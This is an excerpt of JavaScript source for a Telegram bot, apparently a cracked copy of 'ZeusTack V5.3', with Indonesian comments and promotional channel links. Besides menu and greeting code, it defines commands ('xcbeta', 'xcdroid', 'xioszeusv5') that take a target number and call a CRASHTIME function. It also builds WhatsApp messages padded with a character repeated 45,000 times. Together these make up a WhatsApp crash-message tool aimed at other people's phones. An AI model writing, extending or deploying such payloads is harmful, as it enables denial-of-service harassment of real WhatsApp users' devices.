...
const photoUrls = [
  'https://files.catbox.moe/w8tcda.jpg',
  'https://files.catbox.moe/h9o4gt.jpg',  // Ganti dengan URL foto lain
  'https://files.catbox.moe/jcsqlm.jpg',  // Ganti dengan URL foto lain
];
...
const buttons = Markup.inlineKeyboard([
  ...
  [
    Markup.button.callback('𝘽𝙐𝙂 𝙈𝙀𝙉𝙐', 'option1'),
    Markup.button.callback('𝙊𝙒𝙉𝙀𝙍 𝙈𝙀𝙉𝙐', 'option2'),
    Markup.button.callback('𝙍𝘼𝙉𝘿𝙊𝙈 𝙈𝙀𝙉𝙐', 'randommenu'),
  ],
  // Baris kedua: RandomMenu dan About
  [
  ],
  // Baris terakhir: Tombol URL mengarah ke channel
  [Markup.button.url('♦️', 'https://t.me/caywzzaja')],
]);
  await ctx.replyWithPhoto(getRandomPhoto(), {
    caption: `
グ ${greeting}' 
 𝙄 𝙖𝙢 𝙝𝙚𝙧𝙚 𝙩𝙤 𝙝𝙚𝙡𝙥 𝙮𝙤𝙪 𝙬𝙞𝙩𝙝 𝙖𝙣𝙮 𝙥𝙧𝙤𝙗𝙡𝙚𝙢.. 

 𝙥𝙡𝙚𝙖𝙨𝙚 𝙥𝙧𝙚𝙨𝙨 𝙩𝙝𝙚 𝙗𝙪𝙩𝙩𝙤𝙣 𝙗𝙚𝙡𝙤𝙬 
...
bot.action('about', async (ctx) => {
  ...
  const caption = `
${greeting}☁️
Aloo ${ctx.from.first_name || 'User'} Aku Adalah Bot ZeusTack 𝗩5.3 Cracked by @barzzze Yang Siap, Membantu Dengan Masalah Apapun.. 😀
- Penjelasan
䒘 Script cracked Ini Di Kembangkan Oleh
䒘 #@barzzze ( @barzzze )
䒘 Join ZeusTack Information!
䒘 https://t.me/updatescorex
⟣──────────
> © ZeusTack 5.3
  `;
...
const prosesrespone = (target, ctx) => {
    const photoUrl = 'https://files.catbox.moe/8hqblw.jpg'; // Ganti dengan URL gambar lain jika diperlukan
...
bot.command("xcbeta", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
  ...
  for (let i = 0; i < 1; i++) {
        await CRASHTIME(target, { ptcp: true });
...
bot.command("xcdroid", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;
...
bot.command("xioszeusv5",cooldownMiddleware , checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;
...
message: {
listResponseMessage: {
title: "Bang mau join cc lu dong" + "ꦽ".repeat(45000),
listType: 2,
singleSelectReply: {
    selectedRowId: "🩸"
},
...
quotedMessage: {
                buttonsMessage: {
                    documentMessage: {
                        ...
                        fileName: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟x@barzzze",
...
async function CRASHTIME(target, ptcp = true) {
      let sections = [];
